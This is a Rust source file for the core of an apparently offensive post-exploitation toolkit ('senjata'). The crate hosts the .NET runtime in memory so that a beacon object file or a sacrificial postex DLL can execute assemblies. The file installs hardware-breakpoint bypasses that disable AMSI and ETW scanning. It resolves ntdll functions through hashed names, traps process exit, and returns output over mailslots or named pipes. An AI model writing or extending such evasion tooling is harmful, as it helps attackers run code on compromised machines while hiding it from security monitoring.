//! Shared CLR-hosting orchestrator used by both `senjata-execute-assembly`
//! (BOF, inline mode) and `senjata-runner` (postex DLL, sacrificial mode).
#![no_std]

extern crate alloc;


#[cfg(target_os = "windows")]
pub mod error;
#[cfg(target_os = "windows")]
pub use error::OrchestratorError;

pub mod pe_parser;

#[cfg(target_os = "windows")]
pub mod io;
#[cfg(target_os = "windows")]
pub mod cleanup;
#[cfg(target_os = "windows")]
pub mod dispatch;
#[cfg(target_os = "windows")]
pub mod netfx;
#[cfg(target_os = "windows")]
pub mod coreclr;
#[cfg(target_os = "windows")]
pub mod flush;
#[cfg(target_os = "windows")]
pub mod bypasses;

/// Input to `orchestrate`. Both BOF and postex DLL pack their wire-format
/// args into this struct after parsing.
#[cfg(target_os = "windows")]
pub struct OrchestrateInput<'a> {
    pub app_domain: &'a str,
    pub amsi: bool,
    pub etw: bool,
    pub mailslot: bool,
    pub entry_point: u32,
    pub slot_name: &'a str,
    pub pipe_name: &'a str,
    pub asm_args: &'a str,
    pub mode: u32,
    pub main_name: &'a str,
    pub asm_bytes: &'a [u8],
}

/// End-to-end runner. PEB init / HwbpEngine init must be done by the caller
/// (their lifetime crosses the call). Everything CLR-related is owned here.
#[cfg(target_os = "windows")]
pub unsafe fn orchestrate(
    input: &OrchestrateInput<'_>,
    engine: &opsec_hwbp::HwbpEngine,
) -> Result<(), OrchestratorError> {
    unsafe {
        // PE parser → runtime detection (single-file mode only; multi-file
        // mode trusts the caller-bundled blob).
        let asm_info = if input.mode == 1 {
            pe_parser::AsmInfo { runtime: pe_parser::Runtime::NetFx4 }
        } else {
            pe_parser::parse(input.asm_bytes).map_err(|e| match e {
                pe_parser::Error::MixedMode => OrchestratorError::MixedModeUnsupported,
                pe_parser::Error::ArchMismatch => OrchestratorError::ArchMismatch,
                other => OrchestratorError::PeParse(other),
            })?
        };

        // Install ETW / AMSI / AllocConsole HWBP bypasses.
        let _bypasses = bypasses::install(engine, input.amsi, input.etw)?;

        // Open the output channel BEFORE the CLR initializes stdio.
        let mut io_ch = io::IoChannel::open(input.mailslot, input.slot_name, input.pipe_name)?;

        // Capture the cleanup point for the exit-trap (re-entry after
        // Environment.Exit). dispatch::dispatch installs the trap itself.
        let mut invoked = false;
        let (resume_rip, resume_rsp) = cleanup::save_cleanup_point();
        if !invoked {
            invoked = true;

            // Install the exit-trap on RtlExitUserProcess (slot 2).
            let ntdll_h = opsec_strcrypt::hash!("ntdll.dll");
            let exit_h = opsec_strcrypt::hash!("RtlExitUserProcess");
            let exit_target = opsec_peb::resolve_module(ntdll_h)
                .and_then(|m| opsec_peb::resolve_export(m, exit_h))
                .ok_or(OrchestratorError::PebResolve {
                    module_hash: ntdll_h,
                    export_hash: exit_h,
                })?;
            let _exit_trap = engine
                .install_exit_trap(exit_target as usize, 2, resume_rip, resume_rsp)
                .map_err(OrchestratorError::Hwbp)?;

            let dispatch_result = dispatch::dispatch(
                &asm_info,
                input.asm_bytes,
                input.app_domain,
                input.asm_args,
                input.entry_point,
                input.mode,
                input.main_name,
                io_ch.write_handle() as usize,
            );

            // Path A: assembly Main returned normally.
            #[cfg(feature = "debug-io")]
            io_ch.diag_write(b"\n[RUST_END]\n");
            if let Ok(output) = io_ch.drain() {
                if !output.is_empty() {
                    rustbof::eprintln!("\n{}", output);
                }
            }
            dispatch_result?;
        }
        // Path B: Environment.Exit trap re-entered here. Drain again — no-op
        // for path A.
        if let Ok(output) = io_ch.drain() {
            if !output.is_empty() {
                rustbof::eprintln!("\n{}", output);
            }
        }
        let _ = invoked;
        Ok(())
    }
}
